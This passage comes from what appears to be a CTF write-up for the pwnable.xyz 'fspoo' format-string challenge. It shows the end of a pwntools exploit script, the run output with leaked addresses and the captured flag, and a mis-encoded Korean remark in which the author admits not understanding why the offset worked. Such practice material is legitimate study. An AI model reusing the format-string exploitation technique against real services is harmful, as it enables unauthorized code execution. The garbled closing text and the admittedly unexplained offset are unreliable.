r.sendline("-" + str(0x100000000 - addr_ret))

Exit()

r.interactive()
```

```bash
chykor12@ubuntu:~/pwnable.xyz$ python exploit_fspoo.py
[+] Opening connection to svc.pwnable.xyz on port 30010: Done
[*] address of win(): 0x5663b9fd
[*] address of variable 'cmd': 0x5663d040
[*] return address is on 0xff7f9f9c
[*] address of writable memory: 0x5663d100
[*] Switching to interactive mode
FLAG{keen_eye_on_details}[*] Got EOF while reading in interactive
$ 
```

---

:question: ì²˜ìŒì—ëŠ” `"%6$hn"` ì „ì— `0x10`ë°”ì´íŠ¸ë§Œí¼ì˜ ë”ë¯¸ê°€ ìˆìœ¼ë‹ˆ `addr_win_low - 0x10`ì„ ë„£ìœ¼ë©´ ë  ì¤„ ì•Œì•˜ëŠ”ë° ê·¸ë ‡ê²Œ í•˜ë‹ˆê¹Œ ì£¼ì†Œê°€ ì•ˆ ë§ì•„ì„œ ê²°ê³¼ì— ë§ì¶°ì„œ `addr_win_low - 0x19`ë¡œ ë°”ê¿¨ë‹¤. í’€ê¸´ í–ˆëŠ”ë° ì •í™•íˆ ë¬´ìŠ¨ ì›ë¦¬ì¸ì§€ ëª¨ë¥´ê² ë‹¤.